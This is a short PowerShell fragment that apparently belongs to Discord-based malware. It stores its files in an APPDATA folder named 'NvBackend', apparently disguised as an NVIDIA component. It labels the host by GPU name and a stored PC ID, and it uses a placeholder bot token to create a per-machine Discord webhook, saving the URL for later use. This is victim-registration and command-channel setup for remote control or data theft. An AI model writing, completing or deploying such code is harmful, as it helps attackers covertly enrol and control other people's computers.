$APP   = "$env:APPDATA\NvBackend"
$HOOK  = "$APP\hook.txt"
$GPU   = (Get-WmiObject Win32_VideoController | Select-Object -First 1).Name
$PCID  = Get-Content "$APP\pcid.txt"
$NAME  = "$GPU(pc)$PCID"

# Discord bot token & channel
$TOKEN   = "YOUR_BOT_TOKEN"
$CHANNEL = "YOUR_CHANNEL_ID"

if (-not (Test-Path $HOOK)) {
    $body = @{name=$NAME} | ConvertTo-Json
    $headers = @{Authorization="Bot $TOKEN"; "Content-Type"="application/json"}
    $hookUrl = (Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$CHANNEL/webhooks" `
                                  -Method Post -Body $body -Headers $headers).url
    Set-Content $HOOK $hookUrl
}
